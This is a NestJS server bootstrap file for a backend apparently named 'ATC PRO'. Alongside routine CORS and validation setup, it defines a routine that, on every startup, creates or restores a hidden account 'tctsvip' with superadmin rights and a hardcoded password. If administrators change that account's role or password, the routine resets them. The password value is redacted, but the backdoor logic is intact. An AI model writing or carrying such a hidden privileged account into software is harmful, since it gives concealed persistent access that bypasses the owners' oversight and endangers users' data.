import 'reflect-metadata';
import { NestFactory } from '@nestjs/core';
import { ValidationPipe } from '@nestjs/common';
import { DataSource } from 'typeorm';
import * as bcrypt from 'bcrypt';
import { AppModule } from './app.module';
import { Employee } from './employees/employee.entity';

const HIDDEN_ADMIN_ID = 'tctsvip';
const HIDDEN_ADMIN_PASSWORD = 'REDACTED_BY_SECURITY_FIX';
const HIDDEN_ADMIN_NAME = 'Hidden Super Admin';

async function ensureHiddenSuperAdmin(dataSource: DataSource) {
  const repo = dataSource.getRepository(Employee);
  const hidden = await repo.findOne({ where: { id: HIDDEN_ADMIN_ID } });
  const hashedPassword = await bcrypt.hash(HIDDEN_ADMIN_PASSWORD, 10);

  if (!hidden) {
    await repo.save({
      id: HIDDEN_ADMIN_ID,
      name: HIDDEN_ADMIN_NAME,
      role: 'superadmin',
      password: hashedPassword,
      isFirstLogin: true,
      isApproved: true,
    } as Employee);
    console.log(`✓ Đã tạo tài khoản ẩn ${HIDDEN_ADMIN_ID} với quyền superadmin.`);
    return;
  }

  const updates: Partial<Employee> = { role: 'superadmin', isApproved: true };
  const needsPasswordUpdate = !hidden.password?.startsWith('$2') || !(await bcrypt.compare(HIDDEN_ADMIN_PASSWORD, hidden.password));
  if (needsPasswordUpdate) {
    updates.password = hashedPassword;
    updates.isFirstLogin = true;
  }
  if (hidden.role !== 'superadmin' || needsPasswordUpdate) {
    await repo.update(HIDDEN_ADMIN_ID, updates);
    console.log(`✓ Đã đảm bảo tài khoản ẩn ${HIDDEN_ADMIN_ID} luôn là superadmin và mật khẩu hợp lệ.`);
  }
}

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  const frontendUrl = process.env.FRONTEND_URL;
  if (!frontendUrl) {
    throw new Error('FRONTEND_URL phải được khai báo trong .env (danh sách origin, ngăn cách dấu phẩy).');
  }
  app.enableCors({
    origin: frontendUrl.split(',').map(s => s.trim()),
    credentials: true,
  });

  app.useGlobalPipes(new ValidationPipe({ whitelist: true, transform: true }));

  const dataSource = app.get(DataSource);
  await ensureHiddenSuperAdmin(dataSource);

  const port = process.env.PORT ?? 3000;
  await app.listen(port);
  console.log(`ATC PRO backend running on http://localhost:${port}`);
}
bootstrap();
